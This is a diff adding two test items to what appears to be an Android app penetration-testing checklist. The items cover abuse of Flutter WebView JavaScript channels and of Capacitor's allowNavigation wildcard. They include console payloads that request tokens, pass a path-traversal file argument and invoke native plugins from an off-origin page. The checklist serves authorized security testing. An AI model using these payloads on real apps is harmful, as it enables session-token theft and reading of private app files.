+  grep -rn 'JavaScriptChannel\|addJavaScriptHandler' "$DEC/blutter/asm/" | head -20        # the Dart handler bodies: what do they do with the message?
+  grep -rn 'setNavigationDelegate\|onNavigationRequest\|shouldOverrideUrlLoading\|NavigationDecision' "$DEC/blutter/asm/" | head   # the allow-list, if any
+  grep -rn 'addJavascriptInterface' "$DEC/jadx/sources" | grep -iE 'webview_flutter|inappwebview' | head
+  ```
+  ```javascript
+  // from a page you got loaded (route parameter via D19-041/D19-042, or chrome://inspect on a debuggable build):
+  Object.keys(window).filter(k => /^[A-Za-z_]+$/.test(k) && typeof window[k] === 'object' && window[k] && typeof window[k].postMessage === 'function');   // webview_flutter channels
+  window.<Channel>.postMessage(JSON.stringify({type:'getToken'}));
+  window.flutter_inappwebview && window.flutter_inappwebview.callHandler('<handler>', {path:'../../shared_prefs/x.xml'}).then(r => console.log(r));
+  ```
+- **Proof:** A channel/handler call from an off-origin page returning session material, performing a native action
+  (file, navigation, purchase) or reaching a MethodChannel (D19-040) — with the Dart handler quoted from `asm/` and
+  the loading route from D19-041/D19-042.
+- **Escalation:** Token -> D15 replay; a path-taking handler -> D19-040 / D07; the WebView's own configuration -> D10.
+- **Ruled out when:** Every channel's Dart handler validates the loaded URL against a concrete allow-list, or the
+  WebView's navigation delegate refuses every off-origin load including a redirect from an allowed origin (test
+  the redirect, as in D19-047), and no route or extra lets a caller choose the WebView URL. Quote the delegate and
+  the handler locations.
+
+### D19-084 · Capacitor `server.allowNavigation` wildcard keeps the bridge on an off-origin page
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical once a plugin call is returned to the off-origin page; High for the widened origin rules alone |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) for the plugin-driven outcome it enables; the configuration alone is Support |
+| **Attacker** | AM-02 remote one-click (a page on a host that matches the rule), AM-06 where the matching host is reached over cleartext or a lapsed domain |
+| **Applies to** | Capacitor Android; the Cordova counterpart is D19-047 (`<allow-navigation>`), the scheme/mixed-content context is D19-060 |
+| **Requires** | capacitor, webview, js-bridge |
+| **Maps to** | Capacitor `Bridge.java` — `allowedOriginRules` seeded with `scheme + "://" + authority`, then each `server.allowNavigation` entry (bare hosts prefixed with `https://`) and handed to the `WebMessageListener`; MASWE-0035 |
+| **Record** | logs/D19-084.txt (the `allowNavigation` value, the matching page's console output, the plugin response) |
+
+- **Skip when:** `python3 -c "import json;print(json.load(open('$DEC/apktool/assets/capacitor.config.json')).get('server',{}).get('allowNavigation'))"` prints `None` or `[]` → note `D19-084 n/a: no allowNavigation entries; bridge origin = the local-server origin only (D19-060)`.
+- **Test:** Every `server.allowNavigation` entry is added to the bridge's `allowedOriginRules`, so a wildcard
+  (`*`, `*.cdn.example`) or a host the vendor does not control extends `androidBridge` — and with it every plugin
+  (D19-051) and the `/_capacitor_file_` read (D19-049) — to an attacker-reachable origin. D19-060 reads the value;
+  this item proves the bridge survives there.
+- **How:**
+  ```bash
+  python3 -c "import json;print(json.load(open('$DEC/apktool/assets/capacitor.config.json')).get('server',{}).get('allowNavigation'))"   # '*' or '*.host' => bridge origin rules widened
+  # does the bridge survive on a matching origin? load a page on a host you control that matches the rule (any subdomain for '*.x'), then from its console:
+  #   typeof androidBridge; Capacitor.Plugins && Object.keys(Capacitor.Plugins)
+  #   androidBridge.postMessage(JSON.stringify({type:'message',callbackId:'1',pluginId:'Device',methodName:'getInfo',options:{}}))
+  ```
+- **Proof:** `allowNavigation` containing a wildcard or a host you do not control **and** a plugin response returned
+  to a page on that origin (console output next to the config value).
+- **Escalation:** -> D19-049 (`/_capacitor_file_` sandbox read), D19-051 (plugin invocation), D19-050 (device-sourced
+  SSRF) -> token exfiltration -> D15; a lapsed matching domain -> D18 dangling-host rules.
+- **Ruled out when:** `allowNavigation` is absent or lists only concrete first-party hosts, and `androidBridge` is
+  `undefined` on a page from any other origin, including after a redirect from an allowed origin (the redirect
+  test is mandatory, as in D19-047).
 
 ## Graveyard for this domain
 
@@ -3308,3 +3587,4 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   (the `setReadOnly()` mandate covering DEX/JAR/APK but **not** JS or Dart bundles; the implicit-intent
   restriction), the Android 15 16 KB page-size requirement for NDK libraries, and the dynamic-code-loading
   and insecure-WebView-native-bridge risk pages.
+| **Record** | logs/D19-004.txt — the merged-manifest `<meta-data>` dump that the owner items consume |
